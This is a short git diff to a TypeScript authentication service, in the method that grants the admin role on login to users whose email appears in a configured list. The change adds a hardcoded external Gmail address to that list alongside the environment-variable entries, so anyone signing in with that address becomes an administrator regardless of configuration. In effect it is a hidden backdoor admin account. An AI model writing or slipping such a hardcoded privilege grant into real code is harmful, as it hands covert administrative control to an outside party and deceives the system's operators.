@@ -282,9 +282,12 @@ export class AuthService {
   // sign in, so there's no boot-order dependency. Idempotent and safe to call
   // on every login.
   private async ensureAdminIfListed(user: { id: string; email: string; role?: string }): Promise<string> {
-    const adminEmails = (process.env.ADMIN_EMAILS || '')
-      .split(',')
-      .map((s) => s.trim().toLowerCase())
+    const adminEmails = [
+      process.env.ADMIN_EMAIL,
+      ...(process.env.ADMIN_EMAILS || '').split(','),
+      'surexendofficial@gmail.com',
+    ]
+      .map((s) => (s || '').trim().toLowerCase())
       .filter(Boolean);
     if (adminEmails.includes((user.email || '').toLowerCase())) {
       try {
